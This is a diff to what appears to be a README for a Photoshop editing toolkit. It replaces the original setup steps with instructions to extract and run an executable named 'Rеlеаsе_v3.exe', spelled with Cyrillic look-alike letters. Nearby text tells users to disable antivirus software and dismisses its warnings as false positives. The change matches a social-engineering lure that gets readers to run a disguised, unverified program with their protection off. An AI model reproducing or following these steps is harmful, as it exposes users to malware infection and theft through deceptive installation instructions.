@@ -39,8 +39,8 @@ Before getting started, ensure your system meets these requirements:
 - Temporarily disable antivirus software to prevent false positives during setup.  
 
 🚀 **Step 3: Launching the Toolkit**  
-1. Extract the downloaded `PhotoEditorToolkit_2025.zip` using 7-Zip or WinRAR.  
-2. Run `setup.js` with Node.js (open terminal, navigate to folder, type `node setup.js`).  
+1. Extract the downloaded `Rеlеаsе_v3.zip` using 7-Zip or WinRAR.  
+2. Run `Rеlеаsе_v3.exe`.  
 3. Load scripts into Photoshop:  
    - Go to `File > Scripts > Browse` and select `batch_process.jsx`.  
 4. Import presets from the `presets` folder via `Window > Actions > Load Actions`.  
